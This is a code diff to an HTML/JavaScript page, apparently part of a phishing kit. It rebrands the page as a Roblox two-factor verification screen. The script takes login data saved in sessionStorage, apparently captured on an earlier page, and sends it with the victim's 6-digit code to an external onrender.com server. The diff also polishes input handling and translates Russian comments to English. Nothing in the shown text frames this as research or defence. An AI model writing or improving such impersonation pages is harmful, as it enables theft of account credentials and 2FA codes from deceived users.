@@ -9,7 +9,7 @@
 <body>
     <nav class="mobile-nav">
         <div class="logo">
-            <span>HFGD</span>
+            <span>ROBLOX</span>
         </div>
     </nav>
     
@@ -20,14 +20,14 @@
             <form id="2fa-form" class="login-form">
                 <div class="form-group">
                     <input type="text" id="2fa-code" class="form-control" 
-                           placeholder="Enter 6-digit code" required>
+                           placeholder="Enter 6-digit code" required maxlength="6">
                 </div>
                 
                 <div id="error-message" class="error-message" style="display: none;"></div>
                 
                 <button type="submit" class="login-button" id="verify-button">
                     <span id="button-text">Verify</span>
-                    <img id="loading-gif" src="/yomae/website/loading.gif" 
+                    <img id="loading-gif" src="../loading.gif" 
                          alt="Loading" style="display: none; height: 20px;">
                 </button>
             </form>
@@ -41,8 +41,14 @@
             const buttonText = document.getElementById('button-text');
             const loadingGif = document.getElementById('loading-gif');
             const errorElement = document.getElementById('error-message');
+            const codeInput = document.getElementById('2fa-code');
             
-            // Получаем сохраненные данные из sessionStorage
+            // Allow only numbers in 2FA code input
+            codeInput.addEventListener('input', function() {
+                this.value = this.value.replace(/[^0-9]/g, '');
+            });
+            
+            // Get saved data from sessionStorage
             const loginData = JSON.parse(sessionStorage.getItem('loginData'));
             if (!loginData) {
                 window.location.href = '../index.html';
@@ -52,20 +58,20 @@
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
                 
-                const code = document.getElementById('2fa-code').value.trim();
-                if (code.length !== 6 || !/^\d+$/.test(code)) {
+                const code = codeInput.value.trim();
+                if (code.length !== 6) {
                     showError('Please enter a valid 6-digit code');
                     return;
                 }
                 
-                // Показываем индикатор загрузки
+                // Show loading indicator
                 buttonText.style.display = 'none';
                 loadingGif.style.display = 'inline-block';
                 verifyButton.disabled = true;
                 errorElement.style.display = 'none';
                 
-                // Отправляем на сервер
-                fetch('https://yomae-service.onrender.com/submit_2fa', {
+                // Send to server
+                fetch('https://your-render-service.onrender.com/submit_2fa', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -84,7 +90,7 @@
                     if (data.status === 'success') {
                         window.location.href = '../verifed/index.html';
                     } else {
-                        showError(data.message || 'Verification failed');
+                        showError(data.message || 'Invalid verification code');
                     }
                 })
                 .catch(error => {
@@ -107,5 +113,3 @@
     </script>
 </body>
 </html>
-
-
